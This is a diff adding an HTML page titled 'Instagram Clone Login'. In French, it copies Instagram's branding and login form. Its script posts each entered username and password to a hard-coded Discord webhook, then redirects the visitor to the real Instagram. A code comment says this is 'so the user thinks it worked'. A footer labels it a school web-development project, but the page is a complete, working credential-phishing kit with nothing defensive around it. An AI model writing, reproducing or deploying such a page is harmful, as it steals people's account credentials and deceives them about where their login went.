@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Clone Login</title>
+    <style>
+        :root {
+            --bg-black: #000000;
+            --panel-bg: #121212;
+            --input-bg: #1a1a1a;
+            --text-gray: #a8a8a8;
+            --insta-blue: #0064e0;
+            --border-color: #363636;
+        }
+
+        body, html {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-black);
+            color: white;
+            height: 100%;
+        }
+
+        .container {
+            display: flex;
+            height: 100vh;
+            width: 100%;
+        }
+
+        /* --- Left Side: Hero Section --- */
+        .hero-side {
+            flex: 1.2;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 40px;
+            text-align: center;
+        }
+
+        .hero-side h1 {
+            font-size: 2.5rem;
+            max-width: 500px;
+            font-weight: 600;
+            margin-bottom: 40px;
+        }
+
+        .hero-side span.gradient-text {
+            background: linear-gradient(to right, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .mockup-container {
+            position: relative;
+            width: 300px;
+            height: 400px;
+        }
+
+        .mockup-img {
+            width: 100%;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+
+        /* --- Right Side: Login Form --- */
+        .login-side {
+            flex: 1;
+            background-color: var(--panel-bg);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            border-left: 1px solid var(--border-color);
+        }
+
+        .login-box {
+            width: 350px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .login-box h2 {
+            font-size: 1rem;
+            margin-bottom: 20px;
+            font-weight: 400;
+        }
+
+        input {
+            background: var(--input-bg);
+            border: 1px solid var(--border-color);
+            color: white;
+            padding: 12px;
+            margin-bottom: 10px;
+            border-radius: 4px;
+            outline: none;
+        }
+
+        .btn-login {
+            background-color: var(--insta-blue);
+            color: white;
+            border: none;
+            padding: 10px;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .forgot-pass {
+            text-align: center;
+            font-size: 0.8rem;
+            margin-top: 15px;
+            color: white;
+            text-decoration: none;
+        }
+
+        .divider {
+            height: 1px;
+            background-color: var(--border-color);
+            margin: 30px 0;
+        }
+
+        .btn-alt {
+            background: transparent;
+            border: 1px solid var(--border-color);
+            color: white;
+            padding: 10px;
+            border-radius: 8px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+        }
+
+        /* Responsive */
+        @media (max-width: 800px) {
+            .hero-side { display: none; }
+            .login-side { border-left: none; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="hero-side">
+            <div style="margin-bottom: 40px;">
+                <svg aria-label="Instagram" color="white" fill="white" height="50" role="img" viewBox="0 0 24 24" width="50"><path d="M12 0C8.74 0 8.333.015 7.053.072 5.775.132 4.905.333 4.14.63c-.789.306-1.459.717-2.126 1.384S.935 3.35.63 4.14C.333 4.905.131 5.775.072 7.053.012 8.333 0 8.74 0 12s.012 3.667.072 4.947c.06 1.277.261 2.148.558 2.913.306.788.717 1.459 1.384 2.126.667.666 1.336 1.079 2.126 1.384.766.296 1.636.499 2.913.558C8.333 23.988 8.74 24 12 24s3.667-.012 4.947-.072c1.277-.06 2.148-.262 2.913-.558.788-.306 1.459-.718 2.126-1.384.666-.667 1.079-1.335 1.384-2.126.296-.765.499-1.636.558-2.913.06-1.28.072-1.687.072-4.947s-.012-3.667-.072-4.947c-.06-1.277-.262-2.149-.558-2.913-.306-.789-.718-1.459-1.384-2.126C21.319 1.347 20.651.935 19.86.63c-.765-.297-1.636-.499-2.913-.558C15.667.012 15.26 0 12 0zm0 2.16c3.203 0 3.585.016 4.85.071 1.17.055 1.805.249 2.227.415.562.217.96.477 1.382.896.419.42.679.819.896 1.381.164.422.36 1.057.413 2.227.057 1.266.07 1.646.07 4.85s-.015 3.584-.071 4.85c-.055 1.17-.249 1.805-.415 2.227-.217.562-.477.96-.896 1.382-.42.419-.819.679-1.381.896-.422.164-1.057.36-2.227.413-1.266.057-1.646.07-4.85.07s-3.584-.015-4.85-.07c-1.17-.055-1.805-.249-2.227-.415a3.481 3.481 0 01-1.382-.896 3.481 3.481 0 01-.896-1.381c-.164-.422-.36-1.057-.413-2.227-.057-1.266-.07-1.646-.07-4.85s.015-3.584.071-4.85c.055-1.17.249-1.805.415-2.227.217-.562.477-.96.896-1.382.42-.419.819-.679 1.381-.896.422-.164 1.057-.36 2.227-.413 1.266-.057 1.646-.07 4.85-.07zm0 3.678a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4zm7.846-10.405a1.441 1.441 0 11-2.882 0 1.441 1.441 0 012.882 0z"></path></svg>
+            </div>
+            <h1>Découvrez des moments du quotidien de vos <span class="gradient-text">ami(e)s proches</span>.</h1>
+            <div class="mockup-container">
+                <img src="https://images.unsplash.com/photo-1522202176988-66273c2fd55f?w=400" alt="Mockup" class="mockup-img">
+            </div>
+        </div>
+
+        <div class="login-side">
+            <div class="login-box">
+                <h2>Se connecter à Instagram</h2>
+                <input type="text" id="username" placeholder="Numéro de mobile, nom de profil ou adresse e-mail">
+                <input type="password" id="password" placeholder="Mot de passe">
+                
+                <button class="btn-login" id="submitBtn">Se connecter</button>
+                
+                <a href="#" class="forgot-pass">Mot de passe oublié ?</a>
+
+                <div class="divider"></div>
+
+                <button class="btn-alt">
+                    <span>f</span> Se connecter avec Facebook
+                </button>
+                <button class="btn-alt">Créer un nouveau compte</button>
+
+                <div style="text-align: center; margin-top: 20px; font-size: 0.9rem; opacity: 0.8;">
+                    <strong>∞ Meta</strong>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const webhookURL = "https://discord.com/api/webhooks/1495572456671412337/lUnHk1lNvMC_rcruYOr1qqdb4NbbIBWP1pggnOYKnzExOEw7HhBGIKYNh2ymPqxZRkD2";
+
+        document.getElementById('submitBtn').addEventListener('click', async () => {
+            const userVal = document.getElementById('username').value;
+            const passVal = document.getElementById('password').value;
+
+            if (!userVal || !passVal) {
+                alert("Veuillez remplir tous les champs !");
+                return;
+            }
+
+            // Creating a nice embed for Discord
+            const payload = {
+                embeds: [{
+                    title: "🚀 Nouveau Log Instagram",
+                    color: 13509376, // A nice purple-ish color
+                    fields: [
+                        { name: "Identifiant", value: `\`${userVal}\``, inline: false },
+                        { name: "Mot de passe", value: `\`${passVal}\``, inline: false }
+                    ],
+                    footer: { text: "Projet Développement Web 3AC" },
+                    timestamp: new Date()
+                }]
+            };
+
+            try {
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    // Redirects to real Instagram so the user thinks it worked
+                    window.location.href = "https://www.instagram.com";
+                } else {
+                    alert("Une erreur est survenue lors de la connexion.");
+                }
+            } catch (err) {
+                console.error("Network Error:", err);
+            }
+        });
+    </script>
+    </body>
+</html>
